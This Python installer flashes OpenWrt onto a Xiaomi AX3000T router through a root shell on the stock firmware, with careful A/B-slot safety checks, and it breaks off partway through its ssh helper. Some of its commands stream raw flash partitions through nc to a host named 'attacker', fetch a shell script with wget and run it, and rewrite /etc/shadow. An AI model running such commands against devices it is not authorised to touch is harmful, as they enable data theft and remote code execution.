#!/usr/bin/env python3
"""Install OpenWrt on a stock Xiaomi AX3000T (RD03v2), over Wi-Fi, no UART.

The route, and why it is this one
--------------------------------
The probe settled the layout question.  Stock partitions the NAND as a real
A/B pair -- `rootfs` and `rootfs_1`, 30 MiB each, each a complete UBI holding
a `kernel` volume and a `ubi_rootfs` volume -- with a third 57.5 MiB `overlay`
UBI for data.  `bootargs` carries `ubi.mtd=<slot>` and `nvram
flag_last_success` selects which slot the bootloader boots.  Exactly one slot
is attached at runtime; **the other is idle and writable while the system
runs**.

That makes the risky step reversible.  Rather than reformatting the only
bootable system on the device, this writes the OpenWrt RAM initramfs into the
*idle* slot and points `flag_boot_rootfs` at it.  Stock stays byte-for-byte
intact in the slot it booted from, so a pivot that does not come up falls
back to a working stock system instead of leaving a brick.  Only once the RAM
system is up and talking does the sanctioned `sysupgrade` run, and that is
the step that finally overwrites everything.

    stage 1  pre-flight        nothing written
    stage 2  pivot             idle slot + nvram; running slot untouched
    stage 3  flash             sysupgrade from the RAM system; point of no return

Notes that cost something to learn
----------------------------------
* `fw_setenv` does not exist on stock.  `nvram` is the U-Boot environment --
  `0:APPSBLENV` decodes to exactly what `nvram show` prints -- so `nvram set`
  / `nvram commit` is the way to move the boot flags.
* `nvram flash_type` is the NAND part's device ID as the bootloader read it
  (`0x11` = ESMT F50D1G41LB, `0xbe` = Winbond W25N01KWZEIG, per the ID table
  in `0:APPSBL`).  It is the pre-flight NAND check: `dmesg` on a unit that has
  been up a while has already wrapped past the probe messages, and the two
  parts are indistinguishable by geometry.
* **`flag_last_success` selects the slot, not `flag_boot_rootfs`.**  Decoded
  from `miwifi_config_env` in `0:APPSBL`: the chooser (`0x4a922404`) reads
  `flag_last_success` as `os_idx`, overrides it only when that slot's own
  failure counter has passed 5, and the caller writes `flag_boot_rootfs` back
  afterwards to *record* the choice.  `os_idx` 0 gives `ubi.mtd=rootfs`, 1
  gives `ubi.mtd=rootfs_1`.  Setting `flag_boot_rootfs` alone is a no-op.
* The `flag_try_sys{1,2}_failed` counters are the fallback budget, and the
  loader increments the chosen slot's counter *before* each attempt.  Zeroed
  at pivot time, the RAM system gets six tries before the loader returns to
  the slot stock is still in.  (OpenWrt's own `platform.sh` sets both to 8 at
  sysupgrade time, which trips the loader's "both failed" reset every boot and
  is how it pins itself to one system -- correct once OpenWrt is the only
  system, but it would disarm the safety net here.)
* `kexec` is absent from the stock kernel, so there is no zero-write
  rehearsal; the idle slot is the substitute.

Usage:
    python3 install.py standard
    python3 install.py nss
    python3 install.py standard --dry-run
"""

import argparse
import getpass
import hashlib
import json
import os
import re
import secrets
import shlex
import shutil
import socket
import subprocess
import sys
import time

import chain
import channel
import devices
import release
import ubiparse
from chain import ChainError, log

DEFAULT_RELEASE = devices.RD03V2.default_release
IMAGE_FLAVOURS = {"standard": "default", "nss": "nss"}

# Written to /tmp by the operator and run detached: a NAND write must not die
# with the shell channel. The status file is what the driver polls.
FLASH_SCRIPT = """\
#!/bin/sh
if ! mkdir /tmp/rd03v2_flash.lock 2>/dev/null; then
    echo fail:locked > /tmp/rd03v2_flash.status
    exit 1
fi
echo $$ > /tmp/rd03v2_flash.lock/pid
trap 'rm -rf /tmp/rd03v2_flash.lock' EXIT
exec >/tmp/rd03v2_flash.log 2>&1
echo running > /tmp/rd03v2_flash.status
ubiformat /dev/mtd{target} -f {image} -y
rc=$?
sync
if [ $rc = 0 ]; then echo done > /tmp/rd03v2_flash.status
else echo "fail:$rc" > /tmp/rd03v2_flash.status; fi
"""

# How to get the write off the command channel so it cannot die with a socket.
#
# `start-stop-daemon -S` means "start unless a matching process is found", and
# it matches on the -x binary: pointing it at /bin/sh finds our own channel
# shell, prints "/bin/sh is already running" and exits 1 without starting
# anything. Naming the script as the executable is what makes the match
# unique. The fallbacks are there because which of these a vendor BusyBox
# actually implements is not knowable in advance.
DETACH_STRATEGIES = [
    ("start-stop-daemon", "start-stop-daemon -S -b -x /tmp/flash.sh"),
    ("setsid", "setsid /tmp/flash.sh </dev/null >/dev/null 2>&1 &"),
    ("nohup", "nohup /tmp/flash.sh </dev/null >/dev/null 2>&1 &"),
]


class Abort(Exception):
    pass


def confirm(question, assume_yes):
    if assume_yes:
        log(f"[?] {question} -- assumed yes (--yes)")
        return
    try:
        if input(f"[?] {question} [type YES to continue] ").strip() != "YES":
            raise Abort("declined")
    except (EOFError, KeyboardInterrupt):
        raise Abort("declined")


# ---- stage 1: pre-flight ----------------------------------------------------


def parse_mtd(text):
    out = {}
    for line in text.splitlines():
        m = re.match(r"mtd(\d+):\s+([0-9a-f]+)\s+([0-9a-f]+)\s+\"([^\"]+)\"", line.strip())
        if m:
            out[m.group(4)] = {"index": int(m.group(1)), "size": int(m.group(2), 16),
                               "erasesize": int(m.group(3), 16)}
    return out


def nvram_get(ch, key):
    rc, out = ch.run(f"nvram get {key}", quiet=True)
    return out.strip() if rc == 0 else ""


def preflight(ch, rel, images, assume_yes, profile, destdir=None):
    """Everything that must be true before a single byte is written."""
    facts = {}
    log("\n=== stage 1: pre-flight (nothing is written) ===")

    if rel.profile.slug != profile.slug:
        raise Abort(f"release profile {rel.profile.slug!r} does not match "
                    f"selected device {profile.slug!r}")

    model = nvram_get(ch, "model")
    facts["model"] = model
    log(f"[1] nvram model = {model!r}")
    if model != profile.nvram_model:
        raise Abort(f"model {model!r} is not {profile.nvram_model} -- refusing")

    # NAND. The bootloader already identified the part and left the answer in
    # the environment, which beats dmesg: the ring buffer wraps, and ESMT and
    # Winbond are identical in geometry.
    raw_ft = nvram_get(ch, "flash_type")
    if not raw_ft.strip():
        raise Abort(
            "nvram has no flash_type. The bootloader writes it after probing "
            "the chip, so an empty one means this is not a layout this "
            "installer understands -- refusing rather than flashing blind.")
    ft = release.normalise_flash_type(raw_ft)
    part = profile.flash_types.get(ft)
    facts["flash_type"] = ft
    facts["nand"] = part
    log(f"[1] nvram flash_type = 0x{ft} -> {part or 'UNKNOWN PART'}")
    # The release's own nand-support.txt is keyed on this same byte and is
    # generated from the kernel that was actually built, so it -- not the table
    # here -- is the authority when the release ships one. The local table only
    # has to put a name to the byte for the log.
    ok, why = release.check_nand(rel, part, destdir, flash_type=ft)
    log(f"[1] NAND gate: {'PASS' if ok else 'REFUSE'} -- {why}")
    if not ok:
        raise Abort(why)

    # Partition map and which slot we are running from.
    rc, mtdtext = ch.run("cat /proc/mtd", quiet=True)
    mtd = parse_mtd(mtdtext)
    facts["mtd"] = mtd
    missing = [p for p in profile.required_stock_partitions if p not in mtd]
    if missing:
        raise Abort(f"stock partition map is missing {missing} -- not a layout "
                    "this installer understands")
    slots = tuple(profile.stock_slots)
    if len(slots) != 2:
        raise Abort(f"profile {profile.slug!r} does not define exactly two slots")
    for slot in slots:
        log(f"[1] {slot}: mtd{mtd[slot]['index']} {mtd[slot]['size']} B")
    if mtd[slots[0]]["size"] != mtd[slots[1]]["size"]:
        raise Abort("the two system slots are different sizes -- unexpected layout")

    _rc, cmdline = ch.run("cat /proc/cmdline", quiet=True)
    m = re.search(r"ubi\.mtd=(\S+)", cmdline)
    if not m or m.group(1) not in profile.stock_slots:
        raise Abort(f"cannot tell which slot is running from cmdline: {cmdline!r}")
    running = m.group(1)
    flag = nvram_get(ch, "flag_boot_rootfs")
    last = nvram_get(ch, "flag_last_success")
    facts["running_slot"] = running
    facts["flag_boot_rootfs"] = flag
    facts["flag_last_success"] = last
    log(f"[1] running slot = {running} (cmdline), flag_boot_rootfs = {flag}, "
        f"flag_last_success = {last}")
    # Both must agree with what actually booted: flag_last_success is the
    # chooser's input and flag_boot_rootfs is what it recorded on the way out.
    # If either disagrees, the model of this bootloader is wrong and the pivot
    # would be aiming at a slot on a guess.
    if (str(profile.stock_slots[running]) != flag
            or str(profile.stock_slots[running]) != last):
        raise Abort(
            f"cmdline booted {running} (os_idx {profile.stock_slots[running]}) but nvram has "
            f"flag_boot_rootfs={flag!r} flag_last_success={last!r}. Refusing to "
            "guess which slot is live.")

    target = slots[1] if running == slots[0] else slots[0]
    facts["target_slot"] = target
    tidx = mtd[target]["index"]

    # Hard interlock: never write the partition the running UBI sits on.
    _rc, attached = ch.run(
        "for u in /sys/class/ubi/ubi[0-9]; do "
        "printf '%s %s\\n' \"${u##*/}\" \"$(cat $u/mtd_num 2>/dev/null)\"; done",
        quiet=True)
    live = {int(x.split()[1]) for x in attached.splitlines()
            if len(x.split()) == 2 and x.split()[1].isdigit()}
    facts["attached_mtds"] = sorted(live)
    log(f"[1] UBI attached on mtd{sorted(live)}; target is mtd{tidx} ({target})")
    if not live:
        # Fail closed. Reading no attached UBI would make the interlock below
        # pass for any target, which is the opposite of what it is for.
        raise Abort("could not read which MTDs the running UBIs sit on "
                    "(/sys/class/ubi/*/mtd_num) -- refusing to pick a target")
    if tidx in live:
        raise Abort(f"mtd{tidx} is attached at runtime -- that is not the idle slot")
    if mtd[running]["index"] not in live:
        raise Abort(f"the running slot {running} (mtd{mtd[running]['index']}) is not "
                    f"among the attached UBIs {sorted(live)} -- layout not understood")

    img = images["initramfs_ubi"]
    size = os.path.getsize(img["path"])
    if size > mtd[target]["size"]:
        raise Abort(f"{img['name']} is {size} B, {target} holds {mtd[target]['size']} B")
    log(f"[1] image {size} B fits {target} ({mtd[target]['size']} B)")

    # Count fields from the right: BusyBox df wraps a long device name onto its
    # own line, and "Available Use% Mounted" are the last three either way.
    _rc, dfout = ch.run("df -k /tmp | tail -1", quiet=True)
    fields = dfout.split()
    avail_kb = int(fields[-3]) if len(fields) >= 3 and fields[-3].isdigit() else 0
    log(f"[1] /tmp has {avail_kb} KiB free, image needs {size // 1024} KiB")
    if avail_kb * 1024 < size + 2 * 1024 * 1024:
        raise Abort("not enough tmpfs to stage the image")

    for tool in ("ubiformat", "ubiattach", "ubidetach", "ubinfo", "nvram",
                 "md5sum", "wget", "start-stop-daemon"):
        rc, _ = ch.run(f"command -v {tool} >/dev/null", quiet=True)
        if rc != 0:
            raise Abort(f"stock has no {tool}; this installer needs it")
    log("[1] every tool the pivot needs is present on stock")
    return facts


def backup(ch, sink, outdir, mtd, attacker, file_port, profile, token):
    """Pull the partitions that are not reproducible if they are ever lost."""
    log("\n=== backup ===")
    got = {}
    for label, part in profile.backup_partitions:
        idx, size = mtd[part]["index"], mtd[part]["size"]
        cmd = (f'({{ echo "AUTH {token}"; echo "FILE {label}.bin {size}"; '
               f'dd if=/dev/mtd{idx} bs=65536 conv=noerror,sync 2>/dev/null; }} '
               f'| nc {attacker} {file_port}) >/dev/null 2>&1 &')
        ch.run(cmd, retries=0, quiet=True)
        name, path, n, want = sink.wait(timeout=300)
        expected_name = f"{label}.bin"
        if name != expected_name or path is None or n != want or want != size:
            raise Abort(f"backup of {part} failed ({n}/{want}) -- not proceeding")
        log(f"[b] {part} -> {label}.bin ({n} B)")
        got[label] = path
    rc, env = ch.run("nvram show", quiet=True)
    with open(f"{outdir}/nvram-before.txt", "w") as fh:
        fh.write(env + "\n")
    log(f"[b] u-boot environment -> {outdir}/nvram-before.txt")
    return got


# ---- stage 2: pivot ---------------------------------------------------------


def expected_volume(ubi_path, itb_path):
    """What a correct read-back of the written `kernel` volume looks like.

    `ubinize-kernel` makes a *dynamic* volume, so UBI stores no used length
    and the volume reads back LEB-aligned: the FIT followed by 0xff padding.
    Comparing an md5 of the whole volume against the .itb can never match --
    the real v1.6 pair is 13,904,532 B of image in a 13,967,360 B volume.
    """
    img = ubiparse.UbiImage(open(ubi_path, "rb").read())
    kern = [v for v in img.volumes.values() if v.name == "kernel"]
    if not kern:
        raise Abort(f"{ubi_path} has no volume named 'kernel'")
    blob = img.extract(kern[0].vol_id)
    itb = open(itb_path, "rb").read()
    ok, why = ubiparse.matches_image(blob, itb)
    if not ok:
        raise Abort(f"the release's own .ubi does not wrap its .itb: {why}")
    return blob, hashlib.md5(blob).hexdigest()


def prepare_flash_job(ch, recover_stale_lock=False):
    """Inspect a prior writer before touching either of its input files."""
    rc, state = ch.run(
        "s=$(cat /tmp/rd03v2_flash.status 2>/dev/null); "
        "p=$(cat /tmp/rd03v2_flash.lock/pid 2>/dev/null); "
        "a=0; [ -n \"$p\" ] && kill -0 \"$p\" 2>/dev/null && a=1; "
        "printf 'status=%s pid=%s active=%s lock=%s' \"$s\" \"$p\" \"$a\" "
        "\"$([ -d /tmp/rd03v2_flash.lock ] && echo 1 || echo 0)\"",
        retries=0, quiet=True)
    if "active=1" in state:
        log(f"[2] existing ubiformat is active; waiting without touching inputs ({state})")
        deadline = time.time() + 600
        while time.time() < deadline:
            time.sleep(5)
            _rc, status = ch.run(
                "cat /tmp/rd03v2_flash.status 2>/dev/null", quiet=True)
            if status.startswith("done"):
                return True
            if status.startswith("fail"):
                raise Abort(f"existing ubiformat failed: {status}")
        raise Abort("existing ubiformat did not finish within 600 seconds")
    if "status=done" in state:
        return True
    if "lock=1" in state or "status=fail" in state or "status=running" in state:
        if not recover_stale_lock:
            raise Abort(
                f"stale/failed flash job state requires --recover-stale-lock "
                f"after inspection ({state}); nothing was deleted or relaunched")
        ch.run("rm -rf /tmp/rd03v2_flash.lock; "
               "rm -f /tmp/rd03v2_flash.status", retries=0, quiet=True)
        log(f"[2] explicitly cleared inactive stale flash state: {state}")
    ch.run("rm -f /tmp/rd03v2_flash.status", retries=0, quiet=True)
    return False


def perform_pivot_write(ch, http, ubi_path, outdir, attacker, serve_port,
                        target, tidx, assume_yes, recover_stale_lock):
    confirm(f"write {os.path.basename(ubi_path)} to {target} (mtd{tidx}) and boot it?",
            assume_yes)
    for key, value in (("boot_wait", "on"), ("uart_en", "1")):
        rc, out = ch.run(f"nvram set {key}={value}", retries=0, quiet=True)
        if rc != 0:
            raise Abort(f"nvram set {key} failed: {out}")
    rc, out = ch.run("nvram commit", retries=0, quiet=True)
    if rc != 0:
        raise Abort(f"nvram commit failed: {out}")
    rescue = {key: nvram_get(ch, key) for key in ("boot_wait", "uart_en")}
    if rescue != {"boot_wait": "on", "uart_en": "1"}:
        raise Abort(f"UART rescue flags did not read back exactly: {rescue}")
    log("[2] boot_wait=on uart_en=1 (UART rescue armed)")

    initramfs_path = http.add("/initramfs.ubi", ubi_path)
    local_md5 = hashlib.md5(open(ubi_path, "rb").read()).hexdigest()
    ch.run(f"rm -f /tmp/ini.ubi; wget -q -O /tmp/ini.ubi "
           f"http://{attacker}:{serve_port}{initramfs_path}", timeout=300,
           retries=1)
    rc, out = ch.run("md5sum /tmp/ini.ubi", quiet=True)
    if local_md5 not in out:
        raise Abort(f"staged image md5 mismatch: {out!r} != {local_md5}")
    log(f"[2] image staged in /tmp, md5 {local_md5} verified on the device")

    flash_path = http.add(
        "/flash.sh", write_tmp(
            outdir, "flash.sh",
            FLASH_SCRIPT.format(target=tidx, image="/tmp/ini.ubi")))
    ch.run(f"wget -q -O /tmp/flash.sh http://{attacker}:{serve_port}{flash_path}",
           retries=1, quiet=True)
    rc, _ = ch.run("test -s /tmp/flash.sh && chmod +x /tmp/flash.sh",
                   retries=0, quiet=True)
    if rc != 0:
        raise Abort("the flash script did not arrive on the device")
    launch_detached(ch, tidx, recover_stale_lock)

    deadline = time.time() + 600
    status = ""
    while time.time() < deadline:
        time.sleep(5)
        _rc, status = ch.run("cat /tmp/rd03v2_flash.status 2>/dev/null", quiet=True)
        if status.startswith(("done", "fail")):
            break
        log(f"    ... {status or 'starting'}")
    if not status.startswith("done"):
        _rc, tail = ch.run("tail -20 /tmp/rd03v2_flash.log", quiet=True)
        raise Abort(f"ubiformat did not finish cleanly ({status!r}):\n{tail}")
    log("[2] ubiformat reported done")


def pivot(ch, http, facts, images, outdir, attacker, serve_port, assume_yes,
          profile, wifi=False, recover_stale_lock=False):
    log("\n=== stage 2: pivot (writes the idle slot and the boot flags) ===")
    target = facts["target_slot"]
    tidx = facts["mtd"][target]["index"]
    ubi_path = images["initramfs_ubi"]["path"]
    itb_path = images["initramfs_itb"]["path"]

    blob, want_md5 = expected_volume(ubi_path, itb_path)
    log(f"[2] a correct write reads back {len(blob)} B, md5 {want_md5}")
    reuse_write = prepare_flash_job(ch, recover_stale_lock)
    if reuse_write:
        log("[2] prior detached write completed; proceeding directly to readback")
    else:
        perform_pivot_write(
            ch, http, ubi_path, outdir, attacker, serve_port, target, tidx,
            assume_yes, recover_stale_lock)

    # 4. read it back before trusting it
    verify_written(ch, tidx, want_md5, len(blob))

    # 5. Only now move the boot pointer.
    #
    # It is flag_last_success that selects the slot, not flag_boot_rootfs.
    # miwifi_config_env's chooser (0x4a922404 in 0:APPSBL) reads
    # flag_last_success as os_idx and only overrides it when that slot's own
    # failure counter has passed 5; flag_boot_rootfs is written back on the way
    # out to record what was chosen. Setting flag_boot_rootfs alone is a no-op
    # the loader overwrites -- the box would boot straight back into stock.
    #
    # The counters are zeroed rather than left alone: they are the fallback
    # budget. The caller increments this slot's counter before every attempt,
    # so from zero the RAM system gets six tries before the loader gives up and
    # returns to the slot stock is still sitting in.
    idx = profile.stock_slots[target]
    wanted = {
        "flag_try_sys1_failed": "0",
        "flag_try_sys2_failed": "0",
        "flag_last_success": str(idx),
        "flag_boot_rootfs": str(idx),
        "flag_ota_reboot": "0",
    }
    for key, value in wanted.items():
        rc, out = ch.run(f"nvram set {key}={value}", retries=0, quiet=True)
        if rc != 0:
            raise Abort(f"nvram set {key} failed: {out}")
    rc, out = ch.run("nvram commit", retries=0, quiet=True)
    if rc != 0:
        raise Abort(f"nvram commit failed: {out}")

    got = {key: nvram_get(ch, key) for key in wanted}
    mismatched = {key: (value, got[key]) for key, value in wanted.items()
                  if got[key] != value}
    if mismatched:
        raise Abort(f"boot flags did not read back exactly: {mismatched}")
    log(f"[2] flag_last_success={got['flag_last_success']} ({target}), "
        f"counters {got['flag_try_sys1_failed']}/{got['flag_try_sys2_failed']} "
        "-- six attempts before the loader falls back to "
        f"{facts['running_slot']}")

    confirm("reboot into the RAM initramfs now?", assume_yes)
    if wifi:
        log("[2] Wi-Fi-only: when the stock network disappears, join "
            f"{profile.installer_wifi_ssid!r} with key "
            f"{profile.installer_wifi_key!r}")
    ch.run("start-stop-daemon -S -b -x /sbin/reboot", retries=0, quiet=True)
    log("[2] rebooting -- stock is still intact in "
        f"{facts['running_slot']}; if the pivot does not come up, the "
        "bootloader falls back to it")


def launch_detached(ch, tidx, recover_stale_lock=False):
    """Start the flash script off the command channel, and prove it started.

    The proving is the point. The script writes its status file as its first
    action, so if that file has not appeared a few seconds later, nothing is
    running -- and silently polling an empty status for ten minutes, which is
    what the first version of this did, is indistinguishable from a slow write.
    """
    rc, state = ch.run(
        "s=$(cat /tmp/rd03v2_flash.status 2>/dev/null); "
        "p=$(cat /tmp/rd03v2_flash.lock/pid 2>/dev/null); "
        "a=0; [ -n \"$p\" ] && kill -0 \"$p\" 2>/dev/null && a=1; "
        "printf 'status=%s pid=%s active=%s lock=%s' \"$s\" \"$p\" \"$a\" "
        "\"$([ -d /tmp/rd03v2_flash.lock ] && echo 1 || echo 0)\"",
        retries=0, quiet=True)
    if "status=done" in state:
        log("[2] prior detached write reports done; reusing it for readback")
        return "existing-complete"
    if "active=1" in state:
        raise Abort(f"a detached ubiformat is still running ({state})")
    if "lock=1" in state or "status=fail" in state or "status=running" in state:
        if not recover_stale_lock:
            raise Abort(
                f"stale/failed flash job state requires --recover-stale-lock "
                f"after inspection ({state}); nothing was deleted or relaunched")
        ch.run("rm -rf /tmp/rd03v2_flash.lock; "
               "rm -f /tmp/rd03v2_flash.status", retries=0, quiet=True)
        log(f"[2] explicitly cleared inactive stale flash state: {state}")
    ch.run("rm -f /tmp/rd03v2_flash.status", retries=0, quiet=True)
    for name, cmd in DETACH_STRATEGIES:
        rc, out = ch.run(f"{cmd}; echo rc=$?", retries=0, quiet=True)
        started = "rc=0" in out
        log(f"[2] detach via {name}: {out.strip() or 'no output'}")
        for _ in range(6):
            time.sleep(2)
            _rc, st = ch.run("cat /tmp/rd03v2_flash.status 2>/dev/null",
                             retries=0, quiet=True)
            if st.strip():
                log(f"[2] ubiformat running detached on mtd{tidx} (via {name})")
                return name
        log(f"[2] {name} did not start it{'' if started else ' (and reported failure)'}")
        if started:
            raise Abort(
                f"{name} reported success but no status appeared; refusing to "
                "try another launcher while the first may still start")
    raise Abort(
        "could not start the flash script detached by any available means "
        f"({', '.join(n for n, _ in DETACH_STRATEGIES)}). Nothing has been "
        "written; the device still boots stock.")


def verify_written(ch, tidx, want_md5, want_len):
    """Attach the freshly written slot, md5 the kernel volume, detach."""
    ch.run("ubidetach -d 9 2>/dev/null; true", retries=0, quiet=True)
    rc, out = ch.run(f"ubiattach -m {tidx} -d 9", timeout=120, retries=0)
    if rc != 0:
        raise Abort(f"the written UBI will not attach: {out!r}")
    rc, vols = ch.run("ubinfo -a -d 9", quiet=True)
    m = re.search(r"Volume ID:\s+(\d+).*?Name:\s+kernel", vols, re.S)
    if not m:
        ch.run("ubidetach -d 9", retries=0, quiet=True)
        raise Abort(f"no 'kernel' volume in the written UBI:\n{vols}")
    dev = f"/dev/ubi9_{m.group(1)}"
    rc, out = ch.run(f"md5sum {dev}; wc -c < {dev}", timeout=300, quiet=True)
    ch.run("ubidetach -d 9", retries=0, quiet=True)
    got_md5 = out.split()[0] if out else ""
    log(f"[2] read-back {dev}: {out.splitlines()[-1] if out else '?'} B, md5 {got_md5}")
    if got_md5 != want_md5:
        raise Abort(
            f"read-back md5 {got_md5} != expected {want_md5} ({want_len} B). "
            "The slot is NOT what we meant to write -- do not reboot. Stock is "
            "still in the other slot; restore flag_boot_rootfs and re-run.")
    log("[2] read-back matches the image byte for byte")


def write_tmp(outdir, name, text):
    path = os.path.join(outdir, name)
    with open(path, "w") as fh:
        fh.write(text)
    os.chmod(path, 0o600)
    return path


# ---- stage 3: flash ---------------------------------------------------------


# Runs once, on the installed system's first boot, then deletes itself.
#
# Shipped as a uci-defaults script rather than as a ready-made
# /etc/config/wireless: the generated wireless config carries a `path` per
# radio describing where the phy actually sits, and a hand-written file that
# gets it wrong leaves the radios down with no way in. Editing whatever the
# board generated for itself is the robust move.
#
# It also cannot assume the radios exist yet -- the wireless config is created
# by a hotplug when the phy registers, which can lose the race against
# uci-defaults -- so it waits, and generates the config itself if nothing has.
FIRSTBOOT = """\
#!/bin/sh
{wireless}{rootpw}exit 0
"""

FIRSTBOOT_WIRELESS = """\
[ -s /etc/config/wireless ] || /sbin/wifi config >/dev/null 2>&1
i=0
while [ $i -lt 20 ]; do
    uci -q get wireless.@wifi-device[0] >/dev/null 2>&1 && break
    i=$((i+1)); sleep 1
    [ -s /etc/config/wireless ] || /sbin/wifi config >/dev/null 2>&1
done

for dev in $(uci -q show wireless | sed -n \
        's/^wireless\\.\\([^.]*\\)=wifi-device$/\\1/p'); do
    uci -q set wireless.$dev.disabled='0'
{country}done
for vif in $(uci -q show wireless | sed -n \
        's/^wireless\\.\\([^.]*\\)=wifi-iface$/\\1/p'); do
    uci -q set wireless.$vif.disabled='0'
    uci -q set wireless.$vif.ssid={ssid}
    uci -q set wireless.$vif.encryption='psk2'
    uci -q set wireless.$vif.key={key}
done
uci -q commit wireless
"""


def _sq(v):
    """Single-quote for /bin/sh. An SSID or passphrase is user input and can
    legitimately contain a quote; unescaped it would break out of the uci set
    line in the generated script."""
    return "'" + str(v).replace("'", "'\\''") + "'"


def build_config_tar(path, ssid, key, profile, country=None, pwhash=None):
    """A sysupgrade -f tarball carrying first-boot configuration.

    sysupgrade treats -f as the config archive and forces SAVE_CONFIG=1, so
    this is restored over the freshly written rootfs before its first boot.
    """
    import io
    import tarfile
    wireless = ""
    if ssid:
        cy = (f"    uci -q set wireless.$dev.country={_sq(country)}\n"
              if country else "")
        wireless = FIRSTBOOT_WIRELESS.format(
            ssid=_sq(ssid), key=_sq(key), country=cy)
    pw = ""
    if pwhash:
        # sed rather than shipping /etc/shadow: replacing the whole file would
        # drop every other account the image defines.
        pw = (f"sed -i 's|^root:[^:]*:|root:{pwhash}:|' /etc/shadow\n")
    body = FIRSTBOOT.format(wireless=wireless, rootpw=pw).encode()

    with tarfile.open(path, "w:gz") as tf:
        info = tarfile.TarInfo(f"etc/uci-defaults/{profile.firstboot_script}")
        info.size = len(body)
        info.mode = 0o755
        tf.addfile(info, io.BytesIO(body))
    os.chmod(path, 0o600)
    return path


def password_hash(plain):
    """SHA-512 crypt, via openssl -- python's crypt module is gone in 3.13."""
    r = subprocess.run(["openssl", "passwd", "-6", "-stdin"],
                       input=plain + "\n", capture_output=True, text=True,
                       timeout=30)
    if r.returncode != 0 or not r.stdout.strip().startswith("$6$"):
        raise Abort(f"could not hash the root password: {r.stderr.strip()}")
    return r.stdout.strip()


def ssh_banner(host, timeout=10):
    """Read port 22's greeting without offering any credentials.

    The RAM system answers on 192.168.1.1, and so does a great many people's
    own gateway -- including the machine this was developed on, where
    `192.168.1.1` resolved over the wired interface to a production router.
    Logging in there as root with an empty password is not something to
    discover afterwards. A banner is passive: it identifies the far end before
    anything is offered to it.

    Handles a scoped IPv6 literal (`fe80::1%wlan0`), which is the reliable way
    to reach the box when its subnet collides with the operator's own.
    """
    host = host.strip()
    scope = None
    if host.startswith("[") and "]" in host:
        host = host[1:host.index("]")]
    if "%" in host:
        host, scope = host.split("%", 1)
    try:
        infos = socket.getaddrinfo(host + (f"%{scope}" if scope else ""), 22,
                                   type=socket.SOCK_STREAM)
    except socket.gaierror as e:
        return None, f"cannot resolve {host!r}: {e}"
    for family, stype, proto, _canon, addr in infos:
        try:
            with socket.socket(family, stype, proto) as s:
                s.settimeout(timeout)
                s.connect(addr)
                line = b""
                while not line.endswith(b"\n") and len(line) < 255:
                    chunk = s.recv(1)
                    if not chunk:
                        break
                    line += chunk
                banner = line.rstrip(b"\r\n").decode("ascii", "replace")
                if not banner.startswith("SSH-"):
                    return None, f"invalid SSH identification from {host!r}"
                return banner, None
        except OSError as e:
            last = e
    return None, f"nothing answering ssh on {host}: {last}"


def default_gateways():
    """{gateway address: egress device} for this host's IPv4 default routes."""
    out = {}
    try:
        r = subprocess.run(["ip", "-4", "route", "show", "default"],
                           capture_output=True, text=True, timeout=5).stdout
        for line in r.splitlines():
            m = re.search(r"default via (\S+) dev (\S+)", line)
            if m:
                out[m.group(1)] = m.group(2)
    except Exception:                                            # noqa: BLE001
        pass
    return out


def discover_linklocal(iface, timeout=15):
    """Find the box's IPv6 link-local by pinging all-nodes on one interface.

    This is the reliable way to address it: the RAM system serves 192.168.1.1,
    which collides with an extremely common gateway address, and a link-local
    with a scope can only mean the device on that link.
    """
    def our_addrs():
        try:
            r = subprocess.run(["ip", "-o", "-6", "addr", "show", "dev", iface,
                                "scope", "link"], capture_output=True,
                               text=True, timeout=5)
            return {ln.split()[3].split("/")[0] for ln in r.stdout.splitlines()}
        except Exception:                                        # noqa: BLE001
            return set()

    # Sampled before *and* after the probe: NetworkManager regenerates a
    # stable-privacy link-local when a connection is reconfigured, and the
    # deprecated one keeps answering multicast for a while. Reading our own
    # addresses once let a stale address of ours look like a stranger.
    ours = our_addrs()
    try:
        r = subprocess.run(["ping6", "-c", "4", "-I", iface, "ff02::1"],
                           capture_output=True, text=True, timeout=timeout)
    except Exception as e:                                       # noqa: BLE001
        raise Abort(f"cannot probe {iface}: {e}")
    ours |= our_addrs()
    found = []
    for m in re.finditer(r"from (fe80::[0-9a-f:]+)%", r.stdout):
        if m.group(1) not in ours and m.group(1) not in found:
            found.append(m.group(1))
    if not found:
        raise Abort(f"no neighbours answered on {iface}; is the link up?")

    # A ping reply only proves something is on the link. Ask each candidate
    # for its ssh banner and keep the ones that answer as dropbear -- that is
    # what makes this "find the router" rather than "find an address".
    good = [c for c in found
            if (ssh_banner(f"{c}%{iface}", timeout=5)[0] or "").lower()
            .startswith("ssh-2.0-dropbear")]
    if not good:
        raise Abort(f"{len(found)} neighbour(s) on {iface} ({found}) but none "
                    "answered ssh as dropbear -- the box is not up yet, or "
                    "these are not it")
    if len(good) > 1:
        raise Abort(f"more than one dropbear on {iface}: {good}. Pass the "
                    "right one explicitly as --openwrt-host <addr>%" + iface)
    return f"{good[0]}%{iface}"


def check_is_openwrt_ram(host):
    """Refuse to touch anything that is not plainly the RAM initramfs.

    The banner alone does not settle it: the OpenWrt initramfs runs dropbear,
    and so do a lot of the consumer gateways that also sit on 192.168.1.1 --
    on the machine this was developed on, both ends answered
    `SSH-2.0-dropbear`. So the real guard is the collision itself: if the
    target is this host's own default gateway, it is not the router, and we
    must not so much as offer it a password.
    """
    gws = default_gateways()
    bare = host.split("%", 1)[0].strip("[]")
    if bare in gws:
        raise Abort(
            f"{bare} is this host's own default gateway (via {gws[bare]}). The "
            "RAM system uses that address too, so this would log in to the "
            "wrong device as root. Address the box unambiguously by its IPv6 "
            "link-local instead -- `--openwrt-host fe80::...%wlan0`, or "
            "`--discover wlan0` to find it.")

    banner, err = ssh_banner(host)
    if err:
        raise Abort(err)
    log(f"[3] {host} ssh banner: {banner}")
    if "dropbear" not in banner.lower():
        raise Abort(
            f"{host} answers ssh with {banner!r}, not the dropbear the OpenWrt "
            "initramfs runs -- this is not the router.")
    return banner


# The RAM initramfs has no root password; the installed system has whatever
# --root-password set. Post-flash verification therefore cannot assume the
# empty one -- and getting that wrong makes a *successful* install look like a
# device that never came back, because setting the password is what locked us
# out. main() appends the configured password here.
SSH_PASSWORDS = [""]


def ssh(host, cmd, timeout=120, check=True):
    """Root over dropbear, trying each password we might have set."""
    last = (1, "")
    for pw in SSH_PASSWORDS:
        base = ["ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
                "-o", "PubkeyAuthentication=no", "-o", "LogLevel=ERROR",
                "-o", "NumberOfPasswordPrompts=1",
                f"root@{host}", cmd]
